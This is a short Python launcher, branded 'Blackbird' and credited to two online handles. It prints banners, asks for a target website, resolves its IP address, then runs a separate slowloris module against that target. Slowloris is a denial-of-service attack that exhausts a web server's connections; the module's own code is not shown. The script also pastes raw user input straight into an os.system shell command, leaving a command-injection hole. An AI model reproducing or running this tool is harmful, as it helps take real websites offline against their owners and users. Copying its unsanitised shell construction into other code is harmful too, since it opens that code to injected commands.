import sys
import os
import time
import random
import socket
import getpass
os.system("clear")
time.sleep(1)
print (" ")
print( " ")
os.system(" figlet -c Blackbird | lolcat")
print ("                    Tool Created by @Dankshiku | @Kevin696 ")
print(" ")
print (" ")
print( " ")
print('\x1b[6;30;42m' + '' + '\x1b[0m')
target = input(" Target (ex: www.example.com) : ")
os.system("clear")
print(" ")
print ("                           ------------------------------------")
print(f'                          | Target IP address : {socket.gethostbyname(target)} |')
print ("                           ------------------------------------")
print (" ")
os.system(" figlet -c Blackbird | lolcat")
print (" ")
os.system("python module/slowloris.py "+target+"")

